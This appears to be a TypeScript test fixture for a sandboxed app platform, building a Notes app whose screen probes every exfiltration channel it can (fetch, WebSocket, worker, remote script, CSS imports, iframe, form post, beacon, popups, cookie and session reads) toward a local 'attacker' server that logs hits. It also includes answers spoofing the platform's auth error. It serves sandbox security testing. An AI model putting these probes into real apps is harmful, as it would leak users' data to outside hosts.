import { once } from "node:events";
import { createServer } from "node:http";
import type { Server } from "node:http";

/**
 * The App the screen tests run, of spec 8's layout: notes that update live
 * for everyone the App is shared with, a button that fails, an answer that
 * looks like the platform's error, and a screen that tries every way out
 * of its frame it can think of, each aimed at `attacker`. Every call runs
 * its sealed release.
 */

const schema = `import { defineSchema, defineTable, v } from "@grasp-os/sdk";

export default defineSchema({ notes: defineTable({ note: v.string().min(1).max(200) }) });
`;

const operations = `import { v } from "@grasp-os/sdk";
import { action, mutation, query } from "#grasp/server";

/** Every note, each with who wrote it. */
export const list = query({
  args: {},
  returns: v.array(v.string()),
  handler: async (ctx) =>
    (await ctx.db.query("notes").take(100)).map((row) => \`\${row.note} by \${row._ownerId}\`),
});

export const add = mutation({
  args: { note: v.string().min(1).max(200) },
  returns: v.id("notes"),
  handler: async (ctx, args) => await ctx.db.insert("notes", args),
});

/** An answer shaped like the platform's own error, as data. */
export const lookLikeThePlatform = action({
  args: {},
  returns: v.object({ code: v.string(), message: v.string() }),
  handler: () => ({ code: "auth.unauthenticated", message: "Sign in to continue." }),
});

/**
 * The same, as a query's result: a live query's snapshots cross the page's
 * own connection to core, where the page reads core's errors.
 */
export const platformShaped = query({
  args: {},
  returns: v.object({ code: v.string(), message: v.string() }),
  handler: () => ({ code: "auth.unauthenticated", message: "Sign in to continue." }),
});
`;

const registration = `import { app } from "@grasp-os/sdk";
import { add, list, lookLikeThePlatform, platformShaped } from "./operations/notes.ts";
import schema from "./schema.ts";

export default app({
  name: "Notes",
  schema,
  access: { tables: { notes: { read: "appMembers", write: "appMembers" } } },
  operations: { notes: { list, add, lookLikeThePlatform, platformShaped } },
  internalOperations: {},
  screens: [{ name: "notes", path: "/", source: "screens/notes.tsx" }],
  uses: [],
});
`;

const screenCode = (
  attacker: string
) => `import { useAction, useMutation, useQuery } from "@grasp-os/sdk/react";
import { Button } from "@grasp-os/ui/components/button";
import { useEffect, useState } from "react";
import { api } from "#grasp";

const attacker = "${attacker}";
// Tailwind builds this class from the source text, wherever it is.
const tailwindProbe = "bg-[url(${attacker}/tailwind)]";

const settled = async (attempt: () => unknown): Promise<string> => {
  try {
    const result = await attempt();
    return result === null || result === false ? "blocked" : "allowed";
  } catch {
    return "blocked";
  }
};

const imageOutcome = async (): Promise<string> =>
  await new Promise((resolve) => {
    const image = new Image();
    image.addEventListener("load", () => resolve("allowed"));
    image.addEventListener("error", () => resolve("blocked"));
    image.src = \`\${attacker}/image\`;
  });

/**
 * Opens a socket to the attacker, starts a worker and loads a script of
 * the attacker's. A browser that refuses one may say so or say nothing,
 * so none is waited for: the attacker's server says what got out, and the
 * page what ran.
 */
const startUnanswered = (): void => {
  try {
    const socket = new WebSocket(\`\${attacker.replace("http", "ws")}/socket\`);
    socket.addEventListener("open", () => {
      document.body.dataset.socket = "ran";
    });
  } catch {
    // Refused outright.
  }
  try {
    const worker = new Worker(\`data:text/javascript,fetch("\${attacker}/worker");postMessage(1)\`);
    worker.addEventListener("message", () => {
      document.body.dataset.worker = "ran";
    });
  } catch {
    // Refused outright.
  }
  const remote = document.createElement("script");
  remote.addEventListener("load", () => {
    document.body.dataset.remoteScript = "ran";
  });
  remote.src = \`\${attacker}/script.js\`;
  document.head.append(remote);
};

const probe = async (): Promise<Record<string, string>> => {
  const style = document.createElement("style");
  style.textContent = \`@import url(\${attacker}/import); @font-face { font-family: probe; src: url(\${attacker}/font); } html { background-image: url(\${attacker}/style); font-family: probe; }\`;
  document.head.append(style);
  const styled = document.createElement("div");
  styled.classList.add(tailwindProbe);
  document.body.append(styled);
  const frame = document.createElement("iframe");
  frame.src = \`\${attacker}/frame\`;
  document.body.append(frame);
  const form = document.createElement("form");
  form.action = \`\${attacker}/form\`;
  form.method = "post";
  document.body.append(form);
  // Neither says whether it got out: the attacker's server does.
  startUnanswered();
  navigator.sendBeacon(\`\${attacker}/beacon\`, "data");
  form.submit();
  return {
    fetch: await settled(async () => await fetch(\`\${attacker}/fetch\`)),
    fetchCore: await settled(async () => await fetch("/api/auth/get-session")),
    image: await imageOutcome(),
    popup: await settled(() => window.open(\`\${attacker}/popup\`)),
    top: await settled(() => {
      if (window.top) {
        window.top.location.href = \`\${attacker}/top\`;
      }
    }),
    parentDocument: await settled(() => window.parent.document.cookie),
    cookie: await settled(() => document.cookie),
    storage: await settled(() => localStorage.length),
    // The rules are there; only the policy keeps their images out.
    tailwindRule: getComputedStyle(styled).backgroundImage.includes("/tailwind") ? "applied" : "missing",
    styleRule: getComputedStyle(document.documentElement).backgroundImage.includes("/style") ? "applied" : "missing",
  };
};

export default function Notes() {
  const notes = useQuery(api.notes.list, {});
  const add = useMutation(api.notes.add);
  const ask = useAction(api.notes.lookLikeThePlatform);
  const shaped = useQuery(api.notes.platformShaped, {});
  const [answer, setAnswer] = useState("");
  const [probes, setProbes] = useState("");
  useEffect(() => {
    void probe().then((results) => {
      setProbes(JSON.stringify(results));
    });
  }, []);
  return (
    <main className="flex flex-col gap-4 p-4">
      <h1 className="text-lg font-medium">Notes</h1>
      <ul aria-label="Notes">
        {(notes ?? []).map((note) => (
          <li key={note}>{note}</li>
        ))}
      </ul>
      <div className="flex gap-2">
        <Button onClick={() => void add({ note: "Call Acme" })}>Add a note</Button>
        <Button
          onClick={() => {
            throw new Error("Invoice 7 has no total");
          }}
          variant="outline"
        >
          Fail
        </Button>
        <Button
          onClick={() =>
            void ask({}).then((value) => {
              setAnswer(value.code === "auth.unauthenticated" ? "an answer" : "something else");
            })
          }
          variant="outline"
        >
          Ask
        </Button>
      </div>
      <output aria-label="Answer">{answer}</output>
      <output aria-label="Followed">{shaped?.code === "auth.unauthenticated" ? "an answer" : ""}</output>
      <output aria-label="Probes">{probes}</output>
    </main>
  );
}
`;

/** The App's files, with every attempt aimed at `attacker`. */
export const screenAppFiles = (attacker: string): Record<string, string> => ({
  "schema.ts": schema,
  "operations/notes.ts": operations,
  "app.ts": registration,
  "screens/notes.tsx": screenCode(attacker),
});

/**
 * The receiver a screen's attacks are aimed at: it counts every request
 * that reaches it.
 */
export const serveAttacker = async (): Promise<{
  url: string;
  hits: string[];
  server: Server;
}> => {
  const hits: string[] = [];
  const server = createServer((request, response) => {
    hits.push(request.url ?? "");
    // A page, so a frame sent here loads it as any attacker's would.
    response.setHeader("content-type", "text/html");
    response.end("stolen");
  });
  // A WebSocket's opening request counts too, and gets no answer.
  server.on("upgrade", (request, socket) => {
    hits.push(request.url ?? "");
    socket.destroy();
  });
  await once(server.listen(0, "127.0.0.1"), "listening");
  const address = server.address();
  if (address === null || typeof address === "string") {
    throw new Error("The attacker's server has no port");
  }
  return { url: `http://127.0.0.1:${address.port}`, hits, server };
};
